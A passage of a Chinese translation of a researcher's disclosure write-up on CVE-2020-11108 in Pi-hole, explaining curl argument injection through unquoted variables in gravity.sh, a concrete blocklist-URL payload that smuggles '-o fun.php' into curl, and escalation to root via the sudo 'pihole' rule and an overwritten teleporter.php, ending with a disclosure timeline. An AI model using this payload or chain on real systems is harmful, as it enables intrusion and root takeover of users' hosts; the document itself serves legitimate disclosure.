CLI工具来更新拦截列表。然后我查看了代码库，并在[gravity.sh](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L219
"gravity.sh")中发现了gravity_DownloadBlocklistFromUrl函数。  
在执行这个函数时，我发现实际的下载是通过[curl](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L277 "curl")完成的。  
这就是所有乐趣的开始。您会注意到，有很多变量会受到影响。
# Technical Analysis
为了追踪利用路径，我们需要检查这些参数并理解curl如何解析它们。下面是我们应该研究的内容的简化格式（从利用的角度）。  
`curl ${cmd_ext} ${heisenbergCompensator} "${url}" -o "${patternBuffer}"`
你可能会发现的第一件事是cmd_ext和heisenbergCompensator没有用引号引起来，这为我们提供了将参数注入curl的机会。如果你曾经利用过类似的东西（讽刺的是，我有过在curl请求中滥用参数的经历），那么有两个特别有用的参数：`-o`输出，`-x`代理。
为了使事情对我们更有利，curl命令将以root身份运行，意味着我们可以在任何地方写入文件（稍后详细介绍）。由于此脚本由PHP在Web目录中调用，因此任何用`-o`编写的文件都将写入Web目录中。如果我们可以控制参数和内容，那么就可以确保远程代码执行。另一件事是，Curl将优先考虑参数的输入顺序，首先输入的参数将会先被执行。因此`curl
-o a -o b https://frichetten.com`将会把输出写入到a中。
这使得我们仔细研究了没有用引号引起来的两个参数，最终也有两种注入方式。
首先，我们来看看heisenbergCompensator。如果saveLocation变量是一个有效文件，那么会在gravity.sh的第[238](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L238
"238")行设置heisenbergCompensator。如果它是有效/可读的，那么saveLocation变量将用于构造heisenbergCompensator。这是在上一个[函数](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L205
"函数")（gravity_SetDownloadOptions）中设置的，并且是由多个变量构造的。  
`saveLocation="${piholeDir}/list.${i}.${domain}.${domainsExtension}"`
因为我们控制了输入，所以我们可以能够创建带有空格和其他参数的域名。这应该不会对文件名造成问题，并且这些空格可以使我们向curl命令注入自己的参数。为了利用这个，我们使用了以下payload。  
`http://192.168.122.1#" -o fun.php -d "`
这个域名被解析时双引号将被提取。因此，在curl时，变量是这样的，heisenbergCompensator = `-z
/etc/pihole/list.0.192.168.122.1# -o fun.php -d .domains`。
现在，正如您回顾的那样，heisenbergCompensator变量是在验证文件是否存在之后设置。对我们而言，好消息是，更新一次gravity就足以写入下图所示的文件。  
唯一要注意的是，我们必须以200 OK进行响应，以确保文件被写入。根据第[290](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L290
"290")行，这是必须的。
`-d`参数用来处理附加的额外数据。第二次更新Gravity时，curl请求将包含注入的参数并将我们的payload写入Web目录。
你可能想知道是否可以利用这个漏洞来覆盖SSH配置、/etc/shadow或其他文件。不幸的是，我没有找到方法来写入除Web目录之外的其他任何目录。作为后端解析的一部分，所有“/”字符都被正则表达式过滤掉。我花了不少时间来尝试解决此问题，但是没有成功（如果你找到方法，请告诉我）。
这就解决了 heisenberg compentator
的问题，那么cmd_ext呢？坏消息是，仅当BLOCKINGMODE设置为NXDOMAIN时才设置此参数。尽管这是有效的配置，并且由开发人员支持，但它不是Pi-hole附带的默认配置。
但是，如果设置了它，利用方式实际上比上一个方法更容易。cmd_ext在第[274](https://frichetten.com/blog/cve-2020-11108-pihole-rce/:ghttps://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/gravity.sh#L274
"274")行定义，构造如下。  
`cmd_ext="--resolve $domain:$port:$ip"`
因此，我们可以使用之前构造的payload作为域名。引入的空格将使我们能够注入参数，并且使用`-d`参数来处理用于解析的其余数据（特别是':80:'）。
# Escalating Privileges
两种RCE都能达到相同的效果，即得到以www-data用户身份运行的Pi-hole主机上的shell。
从这里开始，我们要提升权限。与开发人员交谈后，他们提到了一种先前公开的权限提升方法，与某些Bash
trickery有关。这是一个非常聪明的方法，但是我真的很想找到自己的方式。
如果你只是看了Pi-hole Web应用程序的源代码，你可能会惊讶地发现它定期调用`sudo pihole`。这是否意味着www-data是没有密码的sudo用户？不，对我们来说很不幸，事实并非如此。但是，www-data确实有一个sudo规则来运行`pihole`命令！  
这感觉像是 CTF
中的一个提示，显然我必须使用pihole脚本本身来进行权限提升。你应该知道的一点是，它实际上是一个Bash脚本，它调用/opt/pihole中的其他Bash脚本。所有都属于root用户，因此很遗憾，我们不能修改其中一个脚本，然后使用sudo运行它。
在浏览这些脚本时，我注意到了一些同样不错的东西。在`/opt/pihole/webpage.sh`中，在第[547](https://github.com/pi-hole/pi-hole/blob/9e490775ff3b20f378acc9db7cec2ae6023fff7f/advanced/Scripts/webpage.sh#L547
"547")行,脚本调用了Web目录中的PHP文件。
从这里开始游戏变得简单，我们可以重复之前的漏洞利用，这次覆盖了teleporter.php。 然后，当我们运行`sudo pihole -a
-t`,它调用在teleporter.php和viola中的payload，然后我们就获得了root权限！
总体而言，这是一次很棒的hacking，我希望我能够解释出它为什么很棒，哪怕只有10％。其中大部分都归结为寻找能够满足后端要求的边缘案例（这个payload迭代了很多轮，直到它生效。最初的版本是使用大括号）。
非常感谢Pi-hole核心团队，感谢他们支持我探索不同的选择以及不断扩展最初的利用方式！
# Disclosure Timeline
2020年3月29日：联系Pi-hole团队  
2020年3月29日：Pi-hole核心团队确认了该报告  
2020年3月30日：与团队会面，提供更多信息/跟踪问题  
2020年3月30日：Mitre分配了CVE-2020-11108  
2020年3月31日：通过heisenbergCompensator发现第二种RCE方法  
2020年4月2日：发现并提交权限提升bug  
2020年5月10日：Pi-hole团队允许我分享bug和PoC